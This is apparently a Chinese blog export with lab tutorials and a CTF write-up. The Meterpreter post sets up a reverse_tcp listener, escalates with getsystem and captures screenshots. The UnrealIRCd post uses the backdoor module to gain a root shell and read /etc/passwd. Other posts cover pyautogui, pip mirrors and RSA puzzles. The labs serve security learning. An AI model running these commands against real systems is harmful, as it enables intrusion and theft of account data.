<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/13.PNG"></p>
<p>编辑<code>/etc/postgresql/9.5/main/pg_hba.conf</code>,最后一行添加<code>host all all 0.0.0.0/32 md5</code>，保存退出</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/14.PNG"></p>
<p><code>service postgresql restart</code>，重启服务</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/15.PNG"></p>
<p>打开msf，<code>workspace --help</code>查看用法</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/16.PNG"></p>
<p><code>workspace -v</code>查看工作空间，只有默认的一个</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/17.PNG"></p>
<p><code>worksapce -a 1</code>,<code>workspace -a 2</code> 添加工作空间1，2，执行<code>workspace -v</code> 查看工作空间</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/18.PNG"></p>
<p><code>workspace -d 1</code>删除工作空间1，执行<code>workspace -v</code> 查看现有工作空间</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/19.PNG"></p>
<p><code>workspace 2</code>切换到工作空间2</p>
<p><code>workspace -d 2</code>删除工作空间2,自动切换到默认工作空间</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8BPostgreSQL/20.PNG"></p>
]]></content>
      <tags>
        <tag>msf</tag>
        <tag>PostgreSQL</tag>
      </tags>
  </entry>
  <entry>
    <title>first-blog</title>
    <url>/blog/2021/11/24/first-blog/</url>
    <content><![CDATA[<h2 id="Test-for-my-first-blog"><a href="#Test-for-my-first-blog" class="headerlink" title="Test for my first blog"></a>Test for my first blog</h2><p>这是正文。</p>
<p><img src="/blog/blog/2021/11/24/first-blog/image-20211124165347049.png"></p>
<p>11</p>
]]></content>
      <tags>
        <tag>test</tag>
      </tags>
  </entry>
  <entry>
    <title>metasploit之meterpreter命令</title>
    <url>/blog/2021/12/21/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/</url>
    <content><![CDATA[<h2 id="metasploit之meterpreter命令"><a href="#metasploit之meterpreter命令" class="headerlink" title="metasploit之meterpreter命令"></a>metasploit之meterpreter命令</h2><h3 id="目的-了解meterpreter命令"><a href="#目的-了解meterpreter命令" class="headerlink" title="目的: 了解meterpreter命令"></a>目的: 了解meterpreter命令</h3><h3 id="原理"><a href="#原理" class="headerlink" title="原理:"></a>原理:</h3><p><code>ps</code>         查询当前目标机所有进程<br><code>getpid</code>       获取当前会话进程<br><code>getuid</code>       当前用户所用的权限，所在用户组<br><code>sysinfo</code>      取系统信息<br><code>getsystem</code>    提升至system最高权限<br><code>shell</code>      进入cmdshell命令模式<br><code>pwd</code>       查看当前所在位置<br><code>cat</code>        查看文本文件<br><code>ipconfig</code>     查看网络配置信息<br><code>migrate pid</code>   迁移pid<br><code>screenshot</code>    截取当前用户屏幕保存到本地</p>
<h3 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h3><p>打开终端，运行msf，<code>use exploit/multi/handler</code>选择exploit，<code>set payload windows/meterpreter/reverse_tcp</code>设置payload，<code>set LHOST 192.168.1.2</code>设置监听主机，<code>set LPORT 11101</code>设置端口</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/1.PNG"></p>
<p>输入<code>exploit -j</code>运行脚本，且在后台监听</p>
<p>靶机双击桌面运行xx.exe，返回kali，已经取得会话</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/2.PNG"></p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/3.PNG"></p>
<p>敲击回车，返回msf，执行<code>sessions</code>，查看会话，再执行<code>sessions 1</code>,进入会话</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/4.PNG"></p>
<p>执行<code>ps</code>查看进程</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/5.PNG"></p>
<p><code>getuid</code> 查看权限</p>
<p><code>pwd</code> 查看当前路径</p>
<p><code>screentshot</code>截图</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/6.PNG"></p>
<p><code>background</code>会话转入后台</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/7.PNG"></p>
<p>新建终端，进入/root目录下，查看截图</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E4%B9%8Bmeterpreter%E5%91%BD%E4%BB%A4/8.PNG"></p>
<p>实验结束</p>
]]></content>
      <tags>
        <tag>msf</tag>
        <tag>meterpreter</tag>
      </tags>
  </entry>
  <entry>
    <title>metasploit溢出UnrealIRCd后门漏洞</title>
    <url>/blog/2021/12/21/metasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h2 id="metasploit溢出UnrealIRCd后门漏洞"><a href="#metasploit溢出UnrealIRCd后门漏洞" class="headerlink" title="metasploit溢出UnrealIRCd后门漏洞"></a>metasploit溢出UnrealIRCd后门漏洞</h2><h3 id="目的：利用UnrealIRCd后门漏洞，获取目标主机的root权限"><a href="#目的：利用UnrealIRCd后门漏洞，获取目标主机的root权限" class="headerlink" title="目的：利用UnrealIRCd后门漏洞，获取目标主机的root权限"></a>目的：利用UnrealIRCd后门漏洞，获取目标主机的root权限</h3><h3 id="原理：某些站点的UnrealIRCd，在DEBUG3-DOLOG-SYSTEM宏中包含外部引入的恶意代码，远程攻击者能够执行任意代码。"><a href="#原理：某些站点的UnrealIRCd，在DEBUG3-DOLOG-SYSTEM宏中包含外部引入的恶意代码，远程攻击者能够执行任意代码。" class="headerlink" title="原理：某些站点的UnrealIRCd，在DEBUG3_DOLOG_SYSTEM宏中包含外部引入的恶意代码，远程攻击者能够执行任意代码。"></a>原理：某些站点的UnrealIRCd，在DEBUG3_DOLOG_SYSTEM宏中包含外部引入的恶意代码，远程攻击者能够执行任意代码。</h3><h3 id="过程："><a href="#过程：" class="headerlink" title="过程："></a>过程：</h3><p>利用nmap扫描主机，确定<code>6667</code>端口开放，对应服务为<code>unreal ircd</code></p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/2.PNG" alt="1"></p>
<p>终端输入msfconsole，进入msf后输入<code>search unreal ircd</code>，搜索相关工具和攻击载荷</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/2.PNG" alt="2"></p>
<p>终端输入命令<code>use exploit/unix/irc/unreal_ircd_3281backdoor</code>,启用漏洞模块</p>
<p>输入show options,查看需要设置的相关选项<br><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/3.PNG" alt="3"><br>设置目标ip</p>
<p>run或者exploit,开始攻击，攻击成功后，建立shell会话</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/4.PNG" alt="4"></p>
<p>终端输入whoami，查看权限root，输入cat /etc/passwd，查看系统账户</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/metasploit%E6%BA%A2%E5%87%BAUnrealIRCd%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E/5.PNG" alt="5"></p>
<p>本机4444端口建立远程会话</p>
]]></content>
      <tags>
        <tag>metasploit</tag>
        <tag>unrealircd</tag>
        <tag>后门</tag>
        <tag>漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>pyautogui的简单基础</title>
    <url>/blog/2021/11/24/pyautogui%E7%9A%84%E7%AE%80%E5%8D%95%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h2 id="pyautogui的简单基础"><a href="#pyautogui的简单基础" class="headerlink" title="pyautogui的简单基础"></a>pyautogui的简单基础</h2><h3 id="安装pyautogui"><a href="#安装pyautogui" class="headerlink" title="安装pyautogui"></a>安装pyautogui</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">pip install pyautogui</span><br></pre></td></tr></table></figure>

<h3 id="查看屏幕大小"><a href="#查看屏幕大小" class="headerlink" title="查看屏幕大小"></a>查看屏幕大小</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pyautogui <span class="keyword">as</span> pag</span><br><span class="line"><span class="built_in">print</span>(pag.size())            <span class="comment">#左上角坐标为(0,0)</span></span><br></pre></td></tr></table></figure>

<h3 id="输出鼠标位置"><a href="#输出鼠标位置" class="headerlink" title="输出鼠标位置"></a>输出鼠标位置</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pyautogui <span class="keyword">as</span> pag</span><br><span class="line"><span class="built_in">print</span>(pag.position())</span><br></pre></td></tr></table></figure>

<h3 id="鼠标点击"><a href="#鼠标点击" class="headerlink" title="鼠标点击"></a>鼠标点击</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pyautogui <span class="keyword">as</span> pag</span><br><span class="line">pag.click(<span class="number">0</span>,<span class="number">200</span>,clicks=<span class="number">3</span>,interval=<span class="number">1</span>,button=<span class="string">&#x27;left&#x27;</span>)</span><br><span class="line"><span class="comment">#前面两个是坐标，clicks是点击次数，默认为1，interval是间隔时间，默认为0，button值为left是鼠标左键，right是右键</span></span><br></pre></td></tr></table></figure>

<h3 id="使用键盘的按键"><a href="#使用键盘的按键" class="headerlink" title="使用键盘的按键"></a>使用键盘的按键</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pyautogui <span class="keyword">as</span> pag</span><br><span class="line">pag.press(<span class="string">&#x27;enter&#x27;</span>)</span><br></pre></td></tr></table></figure>

<h3 id="鼠标移动"><a href="#鼠标移动" class="headerlink" title="鼠标移动"></a>鼠标移动</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pyautogui <span class="keyword">as</span> pag</span><br><span class="line">pag.moveTo(<span class="number">600</span>,<span class="number">800</span>,duration=<span class="number">1</span>)  </span><br><span class="line"><span class="comment">#前面两个参数是坐标，duration是花多少时间移动到目标位置</span></span><br></pre></td></tr></table></figure>

<h3 id="简单写一个实时打印鼠标位置的脚本"><a href="#简单写一个实时打印鼠标位置的脚本" class="headerlink" title="简单写一个实时打印鼠标位置的脚本"></a>简单写一个实时打印鼠标位置的脚本</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pyautogui <span class="keyword">as</span> pag</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000</span>):</span><br><span class="line">    <span class="built_in">print</span>(pag.position())</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br></pre></td></tr></table></figure>

<h3 id="输入文字"><a href="#输入文字" class="headerlink" title="输入文字"></a>输入文字</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pyautogui <span class="keyword">as</span> pag</span><br><span class="line">pag.typewrite(<span class="string">&#x27;nihao &#x27;</span>)</span><br><span class="line">pag.press(<span class="string">&#x27;enter&#x27;</span>)</span><br><span class="line"><span class="comment">#typewrite里面不能是中文，这个是模仿人在按键盘的情况，如果默认输入法是中文，就会模拟人打字拼音一样，最后打出汉字。最后的enter是模拟发送</span></span><br></pre></td></tr></table></figure>

]]></content>
      <tags>
        <tag>python</tag>
        <tag>pyautogui</tag>
      </tags>
  </entry>
  <entry>
    <title>python永久换第三方库国内源</title>
    <url>/blog/2021/11/24/python%E6%B0%B8%E4%B9%85%E6%8D%A2%E7%AC%AC%E4%B8%89%E6%96%B9%E5%BA%93%E5%9B%BD%E5%86%85%E6%BA%90/</url>
    <content><![CDATA[<h2 id="python永久换第三方库国内源"><a href="#python永久换第三方库国内源" class="headerlink" title="python永久换第三方库国内源"></a>python永久换第三方库国内源</h2><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">pip config <span class="built_in">set</span> global.index<span class="literal">-url</span> https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure>

<p> 国内靠谱的 pip 镜像源有：</p>
<p>(1)清华: <a href="https://pypi.tuna.tsinghua.edu.cn/simple">https://pypi.tuna.tsinghua.edu.cn/simple</a></p>
<p>(2)豆瓣: <a href="http://pypi.douban.com/simple/">http://pypi.douban.com/simple/</a></p>
<p>(3)阿里: <a href="http://mirrors.aliyun.com/pypi/simple/">http://mirrors.aliyun.com/pypi/simple/</a></p>
]]></content>
      <tags>
        <tag>python</tag>
        <tag>pip</tag>
      </tags>
  </entry>
  <entry>
    <title>redrock-wp-2021</title>
    <url>/blog/2021/11/24/redrock-wp-2021/</url>
    <content><![CDATA[<h2 id="redrockcrf-wp"><a href="#redrockcrf-wp" class="headerlink" title="redrockcrf        wp"></a>redrockcrf        wp</h2><h2 id="MSIC"><a href="#MSIC" class="headerlink" title="MSIC"></a>MSIC</h2><h3 id="一眼看不出flag："><a href="#一眼看不出flag：" class="headerlink" title="一眼看不出flag："></a>一眼看不出flag：</h3><p>题目：-…/.-/.-/-…/.-/.-/-…/-…/-…/.-/.-/.-/-…/.-/.-/.-/.-/.-/.-/.-/-…/.-/.-/-…/.-/-…/-…/.-/.-/.-</p>
<p>摩斯密码，在线解密，得到BAABAABBBAAABAAAAAAABAABABBAAA，是培根密码，解密结果是soeasy,提交redrock{soeasy}；</p>
<h3 id="ELMA："><a href="#ELMA：" class="headerlink" title="ELMA："></a>ELMA：</h3><p>题目：<img src="https://gitee.com/oxchang/img-host/raw/master/redrock-wp-2021/cover.png" alt="cover"></p>
<p>根据hint，进入对应网站<a href="http://www.atoolbox.net/Tool.php?Id=699">http://www.atoolbox.net/Tool.php?Id=699</a></p>
<p>上传图片解密，得到链接<a href="https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/lsb.jpg">https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/lsb.jpg</a></p>
<p>进去是一个残缺的二维码</p>
<p><img src="https://gitee.com/oxchang/img-host/raw/master/redrock-wp-2021/image-20211124225503078.png" alt="二维码"></p>
<p>修补角上的方块，微信扫码可得到flag，redrock{Welc_0meToR3dRo_ckCup}</p>
<h3 id="yyz的流量："><a href="#yyz的流量：" class="headerlink" title="yyz的流量："></a>yyz的流量：</h3><p>打开往下浏览发现隐隐约约有一些text的包，直接使用wireshark的导出功能，把HTTP的全部导出保存，发现导出的文件中名为_的里面是一个上传界面的html代码，继续往下看，发现了名为1(1).php的文件，打开是一个php马，有eval和str_rot13函数，继续往下翻，在1(36).php文件中发现了一个不寻常的字符串</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">=dee48942104eerqebpx&#123;pr7r1951s077qs97rq166r5838p33r42&#125;</span><br></pre></td></tr></table></figure>

<p>前面知道，使用过rot13函数，就是字母回转13位，r的rot13恰好是e，e的rot13恰好是r，提交格式是redrock{}，拿去rot13处理得到flag：redrock{ce7e1951f077df97ed166e5838c33e42}。</p>
<h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="base全家桶："><a href="#base全家桶：" class="headerlink" title="base全家桶："></a>base全家桶：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3441353234333536353535323433343434423539354135353435353233323442344134323435343535333536343235333443343234383535343535363442343634373441343735343435353533323530343934413437343634463444353235353439344534323535353535363533344334423532343235343439353333323534344134453441343534353532353335363442354134413535344435343332343334433441343434353533344433323535344234363438343434423535344235353439343634383535353735363533344334423441343635353442353234423535343734453434343533343536353333323443343234423536344435313533353234413445343634363531353633323434344135363432343634443532333233323441353234343436343334453433343434423436343635363533353734423537344134443333343535373536344234463442344134413535344234453433353534413445343434353446353635323533344235353541343634353531353335323441343234423534333235303441333534383535333635343332334433443344</span><br></pre></td></tr></table></figure>

<p>两次base16解密，两次base32解密，两次base64解密，base在线工具<a href="https://ctf.bugku.com/tools">https://ctf.bugku.com/tools</a></p>
<p>redrock{bf05214a2d78d93479788d7539e65c46}</p>
<h3 id="福尔摩斯卷卷："><a href="#福尔摩斯卷卷：" class="headerlink" title="福尔摩斯卷卷："></a>福尔摩斯卷卷：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">kb51c4017d556b1fb96d271d56e4c0c93l</span><br><span class="line">2</span><br></pre></td></tr></table></figure>

<p>给了一个特殊的字符串和一个数字2，使用栅栏2解密，得到k9b65d12c7410d1576de545c60bc19f3bl,md5在线解密，得到thecat，flag：redorock{thecat}。</p>
<h3 id="rsa1-txt："><a href="#rsa1-txt：" class="headerlink" title="rsa1.txt："></a>rsa1.txt：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p=147612109163370473726853940149285791098788760038966902274068135592961283314637173338522787501221233131551934112621199764391055903055665279340723435443214438803958052928508552115094413883509444599367111269535437533008007741722534136778697906522597440831904650183582467394987289371711734685640404907683000858869</span><br><span class="line">q=134145904472391973902576127537188273138796743648318009150972571525861699347043125785827603587046356992292094841678408464849493661524744498666837623618686229224916085541762625897015210415204383893950042609518894501871237834449613865282109031947279294496673031276919574492404624447199870341556939907694802827701</span><br><span class="line">c=7171406537089798510466592969749398084350833599048671671010190634899333055862909918342151664413313333765660902754237091176724448872475917302322946683985566991168560127734349306816136872925717657318906100304067087820082954682673527287134580134507242299313951840892376634065947421614950187925674477458658282029981519293253177761031433279849105828544673128353477676140352708860408830611816593919844732880105238278299145783774178566548329991636442667683570875915219233940201001149969221026013239080696867638473136530242759861505871457372008810702942300718202170044796321018490231762301030276976442715775393642929116554148</span><br><span class="line">e=65537p=147612109163370473726853940149285791098788760038966902274068135592961283314637173338522787501221233131551934112621199764391055903055665279340723435443214438803958052928508552115094413883509444599367111269535437533008007741722534136778697906522597440831904650183582467394987289371711734685640404907683000858869</span><br><span class="line">q=134145904472391973902576127537188273138796743648318009150972571525861699347043125785827603587046356992292094841678408464849493661524744498666837623618686229224916085541762625897015210415204383893950042609518894501871237834449613865282109031947279294496673031276919574492404624447199870341556939907694802827701</span><br><span class="line">c=7171406537089798510466592969749398084350833599048671671010190634899333055862909918342151664413313333765660902754237091176724448872475917302322946683985566991168560127734349306816136872925717657318906100304067087820082954682673527287134580134507242299313951840892376634065947421614950187925674477458658282029981519293253177761031433279849105828544673128353477676140352708860408830611816593919844732880105238278299145783774178566548329991636442667683570875915219233940201001149969221026013239080696867638473136530242759861505871457372008810702942300718202170044796321018490231762301030276976442715775393642929116554148</span><br><span class="line">e=65537</span><br></pre></td></tr></table></figure>



<p>知道质数p,q，公钥e，密文c,网上找一个python解密rsa的脚本，修改一下数据</p>
<p>原文链接：<a href="https://blog.csdn.net/qq_40657585/article/details/84874073">https://blog.csdn.net/qq_40657585/article/details/84874073</a></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding:utf8 -</span></span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s,s2n</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span>(<span class="params">a, b</span>):</span>   <span class="comment">#求最大公约数</span></span><br><span class="line">    <span class="keyword">if</span> a &lt; b:</span><br><span class="line">        a, b = b, a</span><br><span class="line">    <span class="keyword">while</span> b != <span class="number">0</span>:</span><br><span class="line">        temp = a % b</span><br><span class="line">        a = b</span><br><span class="line">        b = temp</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a,b</span>):</span>         <span class="comment">#扩展欧几里得算法</span></span><br><span class="line">    <span class="keyword">if</span> a==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span>  (b,<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g,y,x=egcd(b%a,a)</span><br><span class="line">        <span class="keyword">return</span> (g,x-(b//a)*y,y)</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span>(<span class="params">a,m</span>):</span></span><br><span class="line">    g,x,y=egcd(a,m)</span><br><span class="line">    <span class="keyword">if</span> g!=<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;modular inverse does not exist&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x%m</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    p =<span class="number">147612109163370473726853940149285791098788760038966902274068135592961283314637173338522787501221233131551934112621199764391055903055665279340723435443214438803958052928508552115094413883509444599367111269535437533008007741722534136778697906522597440831904650183582467394987289371711734685640404907683000858869</span></span><br><span class="line">    q =<span class="number">134145904472391973902576127537188273138796743648318009150972571525861699347043125785827603587046356992292094841678408464849493661524744498666837623618686229224916085541762625897015210415204383893950042609518894501871237834449613865282109031947279294496673031276919574492404624447199870341556939907694802827701</span></span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    d =modinv(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">    c =<span class="number">7171406537089798510466592969749398084350833599048671671010190634899333055862909918342151664413313333765660902754237091176724448872475917302322946683985566991168560127734349306816136872925717657318906100304067087820082954682673527287134580134507242299313951840892376634065947421614950187925674477458658282029981519293253177761031433279849105828544673128353477676140352708860408830611816593919844732880105238278299145783774178566548329991636442667683570875915219233940201001149969221026013239080696867638473136530242759861505871457372008810702942300718202170044796321018490231762301030276976442715775393642929116554148</span></span><br><span class="line">    n =p*q</span><br><span class="line">    m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">    <span class="built_in">print</span> (n2s(m))</span><br><span class="line">   </span><br></pre></td></tr></table></figure>

<p>运行得出结果flag{rsa_is_so_eeeeeeasy}</p>
<h3 id="rsa2-txt："><a href="#rsa2-txt：" class="headerlink" title="rsa2.txt："></a>rsa2.txt：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">n=27165699915478709899591037909826730786499370104451475178959677543485932094152566857665100521244621688426173292606958647441926888982292857459950857121109158161417783978032371470391030158208122646010467257809663979992182107935125521808536962013120865546513540563130603293071529020712172040077444698746824359887941345818662045893966193039118981343228426520585886421937556928721831233403243298340607111229786172645138352024466710627334325187128901680598546484484520891371243651986807815831171755575193464079906876262015978739931088486581874643062651911618853280170017666942391286592194127295774862811346780551960902842223</span><br><span class="line">c=14860892682685151246974360898504508357567189730834641437675670266937492252182079925060646398074336899604494343435469422435963684873795833714400800354050710861304427343721093962351373940633674174596486988657816166154531054553284511672771023607001785805087118235374781780460455526970561986301598335561615647612753011917110726021390424612599903711440052667556412765563885101457747456109745214502479521693154335343738927702661197280775508492204391466978388628531885614862487165389157874036283924624071145606585226112496333244384395996808647697544773162919037185428415628892217753381811937088861138447144419593241991016116</span><br><span class="line">e=65537</span><br></pre></td></tr></table></figure>



<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Cryptodome.Util.number <span class="keyword">import</span> getPrime</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">p = getPrime(<span class="number">1024</span>)</span><br><span class="line">q = gmpy2.next_prime(p)</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">n = p*q</span><br><span class="line">flag = <span class="string">&#x27;flag&#123;************&#125;&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">n,e,flag</span>):</span></span><br><span class="line">    m = <span class="built_in">int</span>(binascii.hexlify(flag.encode()).decode(),<span class="number">16</span>)</span><br><span class="line">    c = <span class="built_in">pow</span>(m,e,n)</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line">c = encrypt(n,e,flag)</span><br></pre></td></tr></table></figure>

<p>给出n,e,c,使用yafu分解数n，求得P309 = 164820204815667881451830216997273520673704160510528999288311267052928164929154110870792893999538507439807665465929918937860909796806255428508049083149603281706883650885793534757491123121348204344560340210813782875319255176850113664114440116798695137487762411727155531291658550163709763022464037056557871355317<br>P309 = 164820204815667881451830216997273520673704160510528999288311267052928164929154110870792893999538507439807665465929918937860909796806255428508049083149603281706883650885793534757491123121348204344560340210813782875319255176850113664114440116798695137487762411727155531291658550163709763022464037056557871353619</p>
<p>根据rsa1的脚本，修改数值。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*- coding:utf8 -</span></span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s,s2n</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span>(<span class="params">a, b</span>):</span>   <span class="comment">#求最大公约数</span></span><br><span class="line">    <span class="keyword">if</span> a &lt; b:</span><br><span class="line">        a, b = b, a</span><br><span class="line">    <span class="keyword">while</span> b != <span class="number">0</span>:</span><br><span class="line">        temp = a % b</span><br><span class="line">        a = b</span><br><span class="line">        b = temp</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a,b</span>):</span>         <span class="comment">#扩展欧几里得算法</span></span><br><span class="line">    <span class="keyword">if</span> a==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span>  (b,<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g,y,x=egcd(b%a,a)</span><br><span class="line">        <span class="keyword">return</span> (g,x-(b//a)*y,y)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modinv</span>(<span class="params">a,m</span>):</span></span><br><span class="line">    g,x,y=egcd(a,m)</span><br><span class="line">    <span class="keyword">if</span> g!=<span class="number">1</span>:</span><br><span class="line">        <span class="keyword">raise</span> Exception(<span class="string">&#x27;modular inverse does not exist&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> x%m</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    p =<span class="number">164820204815667881451830216997273520673704160510528999288311267052928164929154110870792893999538507439807665465929918937860909796806255428508049083149603281706883650885793534757491123121348204344560340210813782875319255176850113664114440116798695137487762411727155531291658550163709763022464037056557871355317</span></span><br><span class="line">    q =<span class="number">164820204815667881451830216997273520673704160510528999288311267052928164929154110870792893999538507439807665465929918937860909796806255428508049083149603281706883650885793534757491123121348204344560340210813782875319255176850113664114440116798695137487762411727155531291658550163709763022464037056557871353619</span></span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    d =modinv(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">    c =<span class="number">14860892682685151246974360898504508357567189730834641437675670266937492252182079925060646398074336899604494343435469422435963684873795833714400800354050710861304427343721093962351373940633674174596486988657816166154531054553284511672771023607001785805087118235374781780460455526970561986301598335561615647612753011917110726021390424612599903711440052667556412765563885101457747456109745214502479521693154335343738927702661197280775508492204391466978388628531885614862487165389157874036283924624071145606585226112496333244384395996808647697544773162919037185428415628892217753381811937088861138447144419593241991016116</span></span><br><span class="line">    n =p*q</span><br><span class="line">    m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">    <span class="built_in">print</span> (n2s(m))</span><br></pre></td></tr></table></figure>

<p>得到结果flag{yafuuuuuuuuuuu!!}</p>
<h3 id="rsa3-txt："><a href="#rsa3-txt：" class="headerlink" title="rsa3.txt："></a>rsa3.txt：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">n=12193165491232590150686982432557244804300750963175008178236581194544171828897340736916176149173721551510190319108772113575377325860653421908067617797675141336620007755973554040917786258089348023269695843501039718996399429207128831592342485274073559355787675660026139594401556004887413636861987542041178448038883087652407784191872220121749480825916533097977902472760860392352675957455292246566059496154702620024668875067749860935756039381451038144741567698966832403739607807494155714430462171863146787192405435943867107310410641010836155850842469201306161627801130957327434956927373515462512612188696131269636192461423</span><br><span class="line">c=56274920108033865750489777368888541889198069509823093691274482837635646820708448835557485368595293642574121944177628195579346614966976511404731963826581810789</span><br><span class="line">e=3</span><br></pre></td></tr></table></figure>



